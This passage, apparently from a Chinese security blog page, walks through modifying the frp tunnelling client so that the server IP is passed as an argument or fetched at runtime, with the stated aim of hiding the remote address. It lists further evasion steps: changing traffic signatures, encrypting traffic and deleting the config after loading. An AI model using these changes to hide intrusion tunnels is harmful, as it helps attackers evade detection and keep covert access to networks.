+	rootCmd.PersistentFlags().StringVarP(&amp;ip, &quot;server_addr&quot;, &quot;t&quot;, &quot;&quot;, &quot;server_addr&quot;)
+	rootCmd.PersistentFlags().StringVarP(&amp;port, &quot;server_port&quot;, &quot;p&quot;, &quot;&quot;, &quot;server_port&quot;)
+	kcpDoneCh = make(chan struct{})
+}
+</code></pre>
+<p>修改<code>runClient</code>函数</p>
+<pre><code>func runClient(cfgFilePath string,ip string,port string) (err error) {
+	var content string
+	getFileContent(ip,port)
+	//scontent, err = config.GetRenderedConfFromFile(cfgFilePath)
+	content, err = fileContent, nil
+	if err != nil {
+		return
+	}
+
+	cfg, err := parseClientCommonCfg(CfgFileTypeIni, content)
+	if err != nil {
+		return
+	}
+
+	pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(cfg.User, content, cfg.Start)
+	if err != nil {
+		return err
+	}
+
+	err = startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)
+	return
+}
+</code></pre>
+<p>在如下代码中调用<code>runClient()</code></p>
+<pre><code>var rootCmd = &amp;cobra.Command{
+	Use:   &quot;frpc&quot;,
+	Short: &quot;frpc is the client of frp (https://github.com/fatedier/frp)&quot;,
+	RunE: func(cmd *cobra.Command, args []string) error {
+		if showVersion {
+			fmt.Println(version.Full())
+			return nil
+		}
+		// Do not show command usage here.
+		err := runClient(cfgFile,ip,port)
+		if err != nil {
+			fmt.Println(err)
+			os.Exit(1)
+		}
+		return nil
+	},
+}
+</code></pre>
+<p>修改完上面的代码，就可以用</p>
+<pre><code>frpc.exe -t 8.138.152.157 -p 7001
+</code></pre>
+<p>来启动frpc.exe了。</p>
+<p>这种在Windows下不会暴露远程ip，但是在linux下还是会暴露的。</p>
+<p>所以可以直接加一些加密啥的，<code>-t</code>参数传入ip加密后的地址，然后在源码里加一个解密的步骤即可。</p>
+<p>同样也可以将ip地址以十进制或十六进制传入，然后在程序里转换会<code>1.1.1.1</code>格式。</p>
+<p>运行效果如上：</p>
+<h2 id="后续修改方向">后续修改方向</h2>
+<h4 id="1流量特征">1.流量特征</h4>
+<h4 id="2加密-压缩传输流量">2.加密、压缩传输流量</h4>
+<h4 id="3修改0x17特征">3.修改0x17特征</h4>
+<h4 id="4-隐藏frpcini-加载后删除">4. 隐藏frpc.ini 加载后删除</h4>
+<figure data-type="image" tabindex="9"><img src="https://yzs17.github.io/post-images/1731666404984.jpg" alt="" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#frp%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB"><code>FRP</code>代码阅读</a></li>
+<li><a href="#frps">frps</a></li>
+<li><a href="#frpc">frpc</a></li>
+<li><a href="#frp%E7%BC%96%E8%AF%91"><code>FRP</code>编译</a></li>
+<li><a href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%B5%8B%E8%AF%95">内网代理测试</a></li>
+<li><a href="#%E9%A1%B9%E7%9B%AE%E4%BF%AE%E6%94%B9%E7%BC%96%E8%AF%91">项目修改编译</a><br>
+*
+<ul>
+<li><a href="#frpcini%E7%9A%84ip%E9%80%9A%E8%BF%87%E5%8F%82%E6%95%B0%E4%BC%A0%E5%85%A5">frpc.ini的ip通过参数传入</a></li>
+</ul>
+</li>
+<li><a href="#%E5%90%8E%E7%BB%AD%E4%BF%AE%E6%94%B9%E6%96%B9%E5%90%91">后续修改方向</a><br>
+*
+<ul>
+<li><a href="#1%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81">1.流量特征</a></li>
+<li><a href="#2%E5%8A%A0%E5%AF%86-%E5%8E%8B%E7%BC%A9%E4%BC%A0%E8%BE%93%E6%B5%81%E9%87%8F">2.加密、压缩传输流量</a></li>
+<li><a href="#3%E4%BF%AE%E6%94%B90x17%E7%89%B9%E5%BE%81">3.修改0x17特征</a></li>
+<li><a href="#4-%E9%9A%90%E8%97%8Ffrpcini-%E5%8A%A0%E8%BD%BD%E5%90%8E%E5%88%A0%E9%99%A4">4. 隐藏frpc.ini 加载后删除</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://yzs17.github.io/post/cve-2024-48762/">
+              <h3 class="post-title">
+                CVE-2024-48762
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/YZS17" target="_blank">XU17</a>
+  <a class="rss" href="https://yzs17.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
